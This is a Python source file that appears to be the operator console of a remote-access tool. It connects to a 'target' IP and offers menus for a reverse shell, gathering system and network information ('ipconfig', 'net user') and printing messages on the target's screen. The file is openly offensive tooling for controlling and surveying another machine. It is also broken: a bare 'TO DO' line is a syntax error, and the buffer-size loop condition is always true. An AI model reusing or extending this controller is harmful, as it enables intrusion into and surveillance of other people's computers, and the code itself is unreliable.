from ObjetClientTarget import Client
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("-p", "--print_target", action="store_true", help="Show on Target's screen what are doing")
parser.add_argument("-ip", "--ip_target", default="127.0.0.1", type=str,
                    help="define de target's ip, Default is 127.0.0.1 (localhost)")
parser.add_argument("-s", "--shell", action="store_true", help="Skip main menu and go directly to the Shell prompt")
parser.add_argument("-i", "--get_info", action="store_true", help="Skip main menu and go directly to the \"get info\" "
                                                                  "menu")
parser.add_argument("-b", "--buffer_size", type=int, default="2048", choices=[2048, 4096, 8192, 16384],
                    help="Set the buffer size. Default is 2048.")
args = parser.parse_args()


def menu():
    while True:
        print("\t\t============\n\t\t\tMENU\n\t\t============")
        print("welcome, what's your choice?")
        print("1. Reverse Shell \n"
              "2. Get info \n"
              "3. Settings\n"
              "4. Quit \n")
        choice = input("> ")

        if choice == "1":
            client.reverse_shell_send_command()
        if choice == "2":
            menu_getinfo()
        if choice == "3":
            menu_settings()
        if choice == "4":
            break


def menu_getinfo():
    print("\t\t============\n\t\t\tMENU\n\t\tGet Info\n\t\t============")
    print("1. Global information")
    print("2. Network information")
    print("3. list user")
    print("4. Quit")
    choice = input("> ")

    if choice == "1":
        client.getinfo("getinfo_generality")
    if choice == "2":
        client.getinfo("ipconfig")
    if choice == "3":
        client.getinfo("net user")


def menu_print_on_target():
    print("\t\t============\n\t\t\tMENU\n\tPrint on Target Screen\n\t\t============")
    print("1. Print on Target screen")
    print("2. I DON'T want to")
    print("3. Don't change and go back")
    choice = input(">")

    if choice == "1":
        client.print_target(True)
    if choice == "2":
        client.print_target(False)

def menu_settings():
    print("\t\t============\n\t\t\tMENU\n\tSettings\n\t\t============")
    print("Settings: ")
    print("1. Print on target's screen\n"
          "2. Target's buffer size\n"
          "3. Quit \n")
    choice = input("> ")

    if choice == "1":
        menu_print_on_target()
    if choice == "2":
        size_buffer = args.buffer_size + 1
        while size_buffer != 2048 or 4096 or 8192 or 16384:
            size_buffer = input("which size would you want [2048, 4096, 8192, 16384]")
            if size_buffer == 2048 or 4096 or 8192 or 16384:
                client.set_target_buffer(size_buffer)
            else:
                print("Select a correct size please")
                TO DO


client = Client(args.ip_target)
client.buffer = args.buffer_size
try:
    client.connect_to_server()

    if args.print_target:
        client.print_target(True)
    if args.shell:
        client.reverse_shell_send_command()
    if args.get_info:
        menu_getinfo()
    menu()
    client.quit()
except ConnectionRefusedError as msg:
    print("Error: " + str(msg))
    print("The programme on target is not running.")


